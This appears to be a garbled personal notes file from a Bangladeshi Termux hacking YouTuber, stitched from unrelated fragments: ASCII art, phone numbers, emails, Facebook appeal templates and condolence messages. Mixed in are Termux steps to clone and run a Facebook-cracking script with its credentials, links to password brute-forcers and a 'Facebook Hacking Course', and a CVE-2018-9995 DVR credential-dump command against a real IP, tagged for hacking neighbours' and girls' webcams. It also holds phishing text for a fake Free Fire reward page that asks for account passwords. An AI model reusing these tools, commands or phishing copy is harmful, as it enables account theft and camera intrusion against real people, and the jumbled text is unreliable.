+https://web.facebook.com/help/contact/295309487309948?_rdc=1&_rdr
+
+
+
+
+01795878348
+https://www.github.com/MetaChar/Mercury
+
+EMeriLzMdQvI
+
+Cce8.epizy.com
++8801923232415  |3232415
+
+https://www.facebook.com/profile.php?id=100029171801586
+epiz_25990129
+
+
+pkg install imagemagick
+
+colorama
+googling
+
+
+
+exampleabm@gmail.com
+
+https://github.com/Binyamin-binni/bxs
+
+
+https://www.facebook.com/groups/2075414986100302/permalink/2327217790920019/?app=fbl
+
+
+
+
+♻ Script Download:https://drive.google.com/file/d/1HgmwuWVLTqGAzeEETPhXmYkVIxUiMlRx/view?usp=drivesdk
+
+★Script Hosting 000website:
+➡https://youtu.be/rIMSQMjBTV0
+➡https://youtu.be/H7rxihBk3FY
+➡https://youtu.be/FBnHnUdsKPQ
+
+
+★More Script For Facebook:
+➡https://youtu.be/FBnHnUdsKPQ
+➡https://youtu.be/HSJF29Mk93Q
+
+
+★Termux Hosting-[NgRok Link Forward]
+➡https://youtu.be/b3Txo2ngjDU
+➡https://youtu.be/b3Txo2ngjDU
+
+
+
+git clone -b Termux-Support-Branch https://github.com/samyoyo/Trity-1.git
+
+https://github.com/samyoyo/Trity-1
+
+
+
+
+http://95.179.161.108/sw/bd/1/?uclick=qey93zvr&uclickhash=qey93zvr-qey93zvr-rn-0-pm6o-wf3y-wf6o-bd7504#
+*▄───▄************************
+        *█▀█▀█       🅵︎: /ᕼᗩᑕKᗴᖇᗩᗷᗰ   *
+        *█▄█▄█       🆆︎: 01706434237  *
+        *─███──▄▄    🆈︎: ᴛᴇᴄʜᴘᴜʀʙᴅ    *
+        *─████▐█─█      🅂🅄🄱🅂🄲🅁🄸🄱🄴    *
+        *─████───█                   *
+        *─▀▀▀▀▀▀▀         🆃🅴🅲🅷🅿🆄🆁🅱🅳  *
+        *░█████╗░██████╗░███╗░░░███╗ *
+        *██╔══██╗██╔══██╗████╗░████║ *
+        *███████║██████╦╝██╔████╔██║ *
+        *██╔══██║██╔══██╗██║╚██╔╝██║ *
+        *██║░░██║██████╦╝██║░╚═╝░██║ *
+        *╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝ *
+        ******************************
+
+🆃🅴🅲🅷🅿🆄🆁🅱🅳
+
+█████████████████████
+██▀▄─██▄─▄─▀█▄─▀█▀─▄█
+██─▀─███─▄─▀██─█▄█─██
+▀▄▄▀▄▄▀▄▄▄▄▀▀▄▄▄▀▄▄▄▀
+
+⏩
+
+▄───▄
+█▀█▀█
+█▄█▄█
+─███──▄▄
+─████▐█─█
+─████───█
+─▀▀▀▀▀▀▀
+
+
+
+▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
+▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
+▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
+▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
+▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+█████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+█████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+
+
+
+
+
+────────────────────────────────────────────────────────
+─██████████████─██████████████───██████──────────██████─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██───██▒▒██████████████▒▒██─
+─██▒▒██████▒▒██─██▒▒██████▒▒██───██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
+─██▒▒██──██▒▒██─██▒▒██──██▒▒██───██▒▒██████▒▒██████▒▒██─
+─██▒▒██████▒▒██─██▒▒██████▒▒████─██▒▒██──██▒▒██──██▒▒██─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██──██▒▒██─
+─██▒▒██████▒▒██─██▒▒████████▒▒██─██▒▒██──██████──██▒▒██─
+─██▒▒██──██▒▒██─██▒▒██────██▒▒██─██▒▒██──────────██▒▒██─
+─██▒▒██──██▒▒██─██▒▒████████▒▒██─██▒▒██──────────██▒▒██─
+─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒██──────────██▒▒██─
+─██████──██████─████████████████─██████──────────██████─
+────────────────────────────────────────────────────────
+
+
+sohi bukari 5590 
+
+https://github.com/Usamatricker/PAK
+
+https://m.facebook.com/help/contact/342509036134712
+
+https://drive.google.com/drive/u/0/mobile/folders/1k_GdJtXMC-xyG-Rk-H0qEnqxZwX1R1p3
+
+
+
+
+https://www.mediafire.com/folder/yhuxwn0m25gvq/Facebook+Hacking+Course+By+DedSec?ez_cid=CLIENT_ID(AMP_ECID_EZOIC)
+
+
+
+My youtube channel has more than 1000 subscribers. But i have not got community tab yet. Please enable the community tab on my youtube channel.
+
+
+sohi muslim 7375
+270 753 0309
+https://github.com/mnismt/CompressedCrack
+
+https://github.com/b3-v3r/Hunner
+
+Termux Bangla, Termux bd, Termux banglai, termux bangla tutorial, Abm Mujahid, abm mojahid, Abm pur, abm pur bd, tech pur, tech pur bd, abm tube bd, abmpur, 
+
+
+fd4f6i@usbc.be
+
+https://www.facebook.com/100033040247878/posts/259502661827740/?app=fbl
+https://www.facebook.com/100038475560282/posts/241217957170721/?app=fbl
+
+
+https://github.com/The404Hacking/ZIP-Password-BruteForcer
+
+pp423g@fanclub.pm
+Termux new commands No 1👇
+1. apt update && apt upgrade
+2. pkg install python && pkg install python2
+3. pkg install ruby
+4. pkg install git
+5. pip2 install requests mechanize
+6. git clone https://github.com/Binyamin-binni/bxi
+7. cd bxi
+8. ls
+9. chmod +x *
+10. python2 bxi.py
+User : binyamin
+Pass: bxi
+==============================
+
+https://youtu.be/xwuQuQrWm10
+এই চ্যানেলে স্টাইক চলে আসছে,  চ্যানেলটা নষ্টও হয়ে যেতে পারে। আনেক কষ্ট লাগলো আমার।নতুন চ্যানেলের লিংকটি দিলাম, যদি আমার ভিডিও দেখতে চান, তাহলে নতুন চ্যানেলটি সাবস্ক্রাইব করে সাপোর্ট করেন😭
+
+
+
+
+★1st Name: ꔹ͐͐ꔹ͐͐͐ꔹ͐͐͐͐ꔹ͐͐͐͐͐ꔹ͐͐͐͐͐͐ꔹ͐͐͐͐͐͐͐ꔹ͐͐͐͐͐͐͐͐ꔹ͐͐͐͐͐͐͐ꔹ͐͐͐͐͐͐ꔹ͐͐͐͐͐ꔹ͐͐͐͐ꔹ͐͐͐ꔹ͐͐
+
+2nd  name: ꖴ⃕⃔⃝⃯⃮ꖴꕹꕬ⃢ꕬꔹꕬ⃢ꕬꕹꓗꓲꓠꓖꕹꕬ⃢ꕬꔹꕬ⃢ꕬꕹꖴ⃕⃔⃝⃯⃮ꖴ
+
+
+
+
+3rd name: ⃦ꔹ͐͐ꔹ͐͐͐ꔹ͐͐͐͐ꔹ͐͐͐͐͐ꔹ͐͐͐͐͐͐ꔹ͐͐͐͐͐͐͐ꔹ͐͐͐͐͐͐͐͐ꔹ͐͐͐͐͐͐͐ꔹ͐͐͐͐͐͐ꔹ͐͐͐͐͐ꔹ͐͐͐͐ꔹ͐͐͐ꔹ͐͐
+A Google Account for All Google Apps
+
+
+
+
+
+
+
+আসসালামু আলাইকুম 😍
+➡ TechPur BD এর অফিসিয়াল গ্রুপে আপনাকে "স্বাগতম"
+
+✴ আমার ভিডিও গুলো দেখে আপনি ফ্রিতেই Cyber Security Expert হতে পারবেন এবং খুব সহজেই নিজিকে ও আশেপাশের সবাইকে সুরক্ষিত রাখতে পারবেন
+
+🚩TechPur BD  ইউটিউব এ একটা বিশ্বস্ত প্রতিষ্ঠান, আপনি আমাদের সাথে নির্দিধায় কাজ করতে পারেন। আমাদের চ্যানেলে প্রতিদিন নতুন নতুন ভিডিও আপলোড করা হয়, যা দেখে আপনি অনেক কিছু জানতে ও শিখতে পারবেন
+
+➥আমাদের ইউটিউব চ্যানেল:
+▶https://www.youtube.com/c/AbmPurBD
+
+বিঃ দ্রঃ-
+১.আমাদের এই গ্রুপে কোনো প্রকার Scam করা যাবে না।
+২.এই গ্রুপে কোনো লিংক সেয়ার করা যাবে না।
+৩.এই গ্রুপে কোনো বাজে কমেন্ট/কাউকে ছোটো করে কথা বলা যাবে না।
+৪.পোস্টে অযথা হা😃হা রিয়্যাক্ট দিলে Block মারা হবে।
+৫.Admin যদি মনে করে আপনি গ্রুপের পরিবেশ নষ্ট করছেন কোনো Worning ছাড়াই আপনাকে Block মারা হবে।
+
+ধন্যবাদ 🌹
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̋̎̎̎̎̎̎̎̎̎̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́́́́̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊́̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́́́́̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊́̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́́́́̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊́̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́́́́̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊́̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́́́́̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊́̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́́́́̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊́̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎̎́́̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇̇ၥ̤̤̤̤̤̣̣̣̣̣̣̣̣̣̣̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅̅
+
+
+
+
+
+
+Oi Jogador
+Seja Bem-vindo ão Free Fire eventos
+Click em Próximo para continua para continua
+
+
+Hi Player 
+Welcome to Free Fire events Click Next to continue to continue
+
+
+
+PRÓXIMOl :NEXT
+
+Site de resgate de recompensas
+Notificação de Penteação:
+1.Redenção Kode 12 Personagem, consistindo de maiúsculas e números.
+2.Itens presentes são exibidos em  Tabulação no lobby do jogo; Ouro ou diamantes serão adicionados à Carteira da conta automaticamente.
+3.Por favor, note a data de vencimento do resgate. Códigos expirados não podem ser trocados.
+4.Entre em contato com o atendimento ao cliente se tiver algum problema.
+5.Lembrete: você não poderá resgatar seu prêmi uma conta de convidado. Você pode vincular sua conta ao Facebook ou VK para receber um prêmio.
+
+Rewards redemption site Combing Notification: 
+1. Kode 12 Character Redemption, consisting of capitals and numbers. 
+
+2. Present items are displayed in Tab in the game lobby; Gold or diamonds will be added to the Account Wallet automatically.
+
+ 3.Please note the redemption due date. Expired codes cannot be exchanged.
+
+ 4. Contact customer service if you have any problems. 
+
+5. Reminder: you will not be able to redeem your prize with a guest account. You can link your account to Facebook or VK to receive an award.
+
+
+
+
+Site de recompensa:
+Pleenchar o login.
+Seu Nome:
+Digit... seu Nome
+Email:
+Dig... seu Email
+Digit... Sua Conta
+Senha:
+dig sua senha
+
+Reward site:
+ Fill in the login.
+ Your name:
+ Digit ... your Name 
+Email:
+ Dig ... your Email 
+Digit ... Your Account 
+Password: 
+type your password
+https://www.facebook.com/groups/LearningAndEarningBD/permalink/335846393542308/?app=fbl
+
+https://github.com/CellularPrivacy/Android-IMSI-Catcher-Detector/
+
+
+3cb45e42b5b242005ad21c89977560e7
+
+https://github.com/M3-SEC/firefly
+
+ডিজেল আইডি লিংক সাব
+
+
+https://m.facebook.com/help/contact/378730658849959?id=378730658849959
+
+
+Sir, due to security policy my real account was disable.My business related important messages are in this account so this account is badly needed sir. Here i am submitting my Id.Please check and give back my account. 
+Thank you Facebook Team
+
+
+Sir, my account was Photo Yourself Issue problem, I uploaded my Real Face Picture, But Don't Open My account. Please sir, unlocked my account Very Urgent Account Sir my account was accidentally logged into my friend's phone. He has done something in my account, when I am logging in to my account, I am uploading a photo. Upload my face picture and I uploaded my clear face photo but my account was not opened. Now I show! You Can't use facebook at the moment. Please Sir, this account is very important, because! My business document information saves my profile. I hope this is by solving my account problem and I always respect the Facebook support community, Thank You Facebook Team.
+
+anik846@fuwamofu.com 
+
+abmmojahid@macr2.com
+
+1. we are never ready to say goodbye fore ever though we know it is a part of life. This day our hearts are heavy for losing someone s special but as we mourn your Death, we olso celebrate your life. Rest in peace.
+R.I.P
+
+2. We Are very shocked for your deaths COVID-19
+
+Rest in Peache my brother😥
+
+R.I.P.
+
+3. May my Prayer to the Almighty be at Peace To the soul of your.... Name..., A good man stopped bearing,  a good spirit soaked In heaven.
+
+
+
+4. #Rip
+Covid-19 Spammer virus a mara gelen jatir boudi😢😢
+
+
+
+
+5. We Are very shocked for your deaths COVID-19
+
+Rest in Peache my brother😥
+
+R.I.P.
+
+
+1. we are never ready to say goodbye fore ever though we know it is a part of life. This day our hearts are heavy for losing someone s special but as we mourn your Death, we olso celebrate your life. Rest in peace.
+R.I.P
+
+2. We Are very shocked for your deaths COVID-19
+
+Rest in Peache my brother😥
+
+R.I.P.
+
+3. May my Prayer to the Almighty be at Peace To the soul of your.... Name..., A good man stopped bearing,  a good spirit soaked In heaven.
+
+
+
+4. #Rip
+Covid-19 Spammer virus a mara gelen jatir boudi😢😢
+
+
+
+
+5. We Are very shocked for your deaths COVID-19
+
+Rest in Peache my brother😥
+
+R.I.P.
+
+
+
+
+
+First name  ꒌ̳̳̳̳̳̳̳̳ꒌ̳̳̳̳̳̳̳̳ͫꒌ̳̳̳̳̳̿̿̿̿̿ꒌ̳̳̳̳̿̿̿̿̿ꒌ̳̳̍̍̍̍̍̅̿̽̑̑ꒌ̍̍̍̍̍̅̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̐ ํํํํํํํํํํํํํํํํํํํํํํํํํํํํํ
+
+
+
+
+
+
+
+
+
+Lastname  ̍̍̅̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̐̐ꒌ̳̳̍̍̍̍̍̅̿̽̑̑ꒌ̳̳̳̳̿̿̿̿̿ꒌ̳̳̳̳̳̿̿̿̿̿ꒌ̳̳̳̳̳̳̳̳ͫꒌ̳̳̳̳̳̳̳̳
+
+
+
+
+
+
+
+Nickname 
+ 
+                     ꒌ̳̳̳̳̳̳̳̳ꒌ̳̳̳̳̳̳̳̳ͫꒌ̳̳̳̳̳̿̿̿̿̿ꒌ̳̳̳̳̿̿̿̿̿ꒌ̳̳̍̍̍̍̍̅̿̽̑̑ꒌ̍̍̍̍̍̅̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̐ ํํํํํํํํํํํํํํํํํํํํํํํํํํํํํꒌ̍̍̍̍̍̅̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̿̐̐ꒌ̳̳̍̍̍̍̍̅̿̽̑̑ꒌ̳̳̳̳̿̿̿̿̿ꒌ̳̳̳̳̳̿̿̿̿̿ꒌ̳̳̳̳̳̳̳̳ͫꒌ̳̳̳̳̳̳̳̳
+
+
+
+
+https://m.facebook.com/help/contact/651319028315841
+
+
+5rtdfy6ifdchxfupo8yy4gyuhdzcvhhfthvgg8655ytdtoljhv
+
+https://youtu.be/16j_6JPr8m4
+
+Credit:
+
+https://free.facebook.com/profile.php?id=100033743387934
+
+
+https://www.facebook.com/kaul.amenul
+
+https://www.facebook.com/100007383730149/posts/2580573295532103/?app=fbl
+cam10May2020114002.png cam10May2020113851.png cam10May2020113935.png cam10May2020114004.png cam10May2020113852.png cam10May2020113937.png cam10May2020114005.png cam10May2020113854.png cam10May2020113938.png cam10May2020114007.png cam10May2020113855.png cam10May2020113940.png cam10May2020114008.png cam10May2020113857.png cam10May2020113941.png cam10May2020114010.png cam10May2020113858.png 
+
+cam10May2020113900.png cam10May2020113952.png cam10May2020113901.png cam10May2020113953.png cam10May2020113918.png cam10May2020113955.png cam10May2020113920.png cam10May2020113956.png cam10May2020113922.png cam10May2020113958.png cam10May2020113923.png  cam10May2020113959.png cam10May2020113925.png cam10May2020114001.png cam10May2020113926.png cam10May2020113928.png cam10May2020113929.png cam10May2020113931.png cam10May2020113932.pngi cam10May2020113934.png cam10May2020113943.png cam10May2020113944.png  
+
+
+
+Sk Films YouTube Channel 
+Movie Trailer link: https://youtu.be/qKLbKIeD77g
+Movie Name: Bir
+HERO: Shakib Khan
+Detector: Kazi Hayat 
+Bir movie Benar download link:https://www.google.com/search?q=bir&client=ms-android-symphonyedison&prmd=vin&sxsrf=ALeKk01rA5WjvLHD9PZFP4pnE0DE01tEVw:1589009280026&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjrzrjtoKbpAhVhILcAHZMeBaYQ_AUoAnoECBYQAg&biw=320&bih=490&dpr=1.5#imgrc=psgyiSEJFoGiyM
+
+Please "SK Films" Dont Strike Me Please.😢
+
+
+5rtdfy6ifdchxfupo8yy4gyuhdzcvhhfthvgg8655ytdtoljhv
+
+mdjaherul.islam.520562
+
+
+https://gitlab.com/Sumarr-ID/hack-fb.git
+
+
+Termux Real Way || Tech Pur BD 
+
+Video Description:
+
+git https://github.com/ezelf/CVE-2018-9995_dvr_credentialsclone
+
+
+
+https://github.com/ezelf/CVE-2018-9995_dvr_credentials
+
+
+★ python getDVR_Credentials.py --host 78.189.195.190 --p 80
+
+Music Credit: https://youtu.be/ZD0iHCQQVWs
+
+Video Tag : how to hack cctv camera in few minutes , how to hack , how to hack cameras from mobile , hack nearby camera , camera hacking , camera hack , realtime camera hack , cctv camera hacking , webcam hack , webcam hacking , security camera hacking , how to hack others webcam , how to hack neighbours camera , how to hack girls webcam , how to hack public camera , how to delete camera files , hacking tricks , live camera hack , hack camera from mobile phones , hack cctv from computer,AbmPur BD, abmpur, Abm Pur, Abm Pur BD, Abm Pur bd, Abm
+
+
+
+
+https://www.facebook.com/100009024536288/posts/
+
+https://www.facebook.com/100014059390835/posts/858933371251968/?app=fbl
+
+https://www.facebook.com/100041133009152/posts/204837037564062/?app=fbl
+https://www.facebook.com/nayem.rj
+
+
+Dear YouTube,
+This video shows me how to find a Facebook ID with Termux. It does not circumvent any community guidelines. Rather it helps to inform about the security system of Facebook. So, Remove Your strike from this video.
+
+🅵︎: /ᕼᗩᑕKᗴᖇᗩᗷᗰ
+🆆︎: +8801706434237
+🆈︎: ᴛᴇᴄʜᴘᴜʀʙᴅ
+🅂🅄🄱🅂🄲🅁🄸🄱🄴
+
+
+
+
+
+
+
+░█████╗░██████╗░██████╗░██╗
+██╔══██╗██╔══██╗██╔══██╗██║
+███████║██████╔╝██████╔╝██║
+██╔══██║██╔══██╗██╔═══╝░██║
+██║░░██║██║░░██║██║░░░░░██║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
+
+
+
+
+
+
+
+─────────────────────────────────────────────────────────────
+─██████████████─████████████████───██████████████─██████████─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒██─
+─██▒▒██████▒▒██─██▒▒████████▒▒██───██▒▒██████▒▒██─████▒▒████─
+─██▒▒██──██▒▒██─██▒▒██────██▒▒██───██▒▒██──██▒▒██───██▒▒██───
+─██▒▒██████▒▒██─██▒▒████████▒▒██───██▒▒██████▒▒██───██▒▒██───
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██───██▒▒██───
+─██▒▒██████▒▒██─██▒▒██████▒▒████───██▒▒██████████───██▒▒██───
+─██▒▒██──██▒▒██─██▒▒██──██▒▒██─────██▒▒██───────────██▒▒██───
+─██▒▒██──██▒▒██─██▒▒██──██▒▒██████─██▒▒██─────────████▒▒████─
+─██▒▒██──██▒▒██─██▒▒██──██▒▒▒▒▒▒██─██▒▒██─────────██▒▒▒▒▒▒██─
+─██████──██████─██████──██████████─██████─────────██████████─
+─────────────────────────────────────────────────────────────
+
+
+
+
+💀👀💀
+
+
+░█████╗░██████╗░███╗░░░███╗
+██╔══██╗██╔══██╗████╗░████║
+███████║██████╦╝██╔████╔██║
+██╔══██║██╔══██╗██║╚██╔╝██║
+██║░░██║██████╦╝██║░╚═╝░██║
+╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝
+
+░█████╗░██████╗░███╗░░░███╗
+██╔══██╗██╔══██╗████╗░████║
+███████║██████╦╝██╔████╔██║
+██╔══██║██╔══██╗██║╚██╔╝██║
+██║░░██║██████╦╝██║░╚═╝░██║
+╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝
+
+░█████╗░██████╗░███╗░░░███╗
+██╔══██╗██╔══██╗████╗░████║
+███████║██████╦╝██╔████╔██║
+██╔══██║██╔══██╗██║╚██╔╝██║
+██║░░██║██████╦╝██║░╚═╝░██║
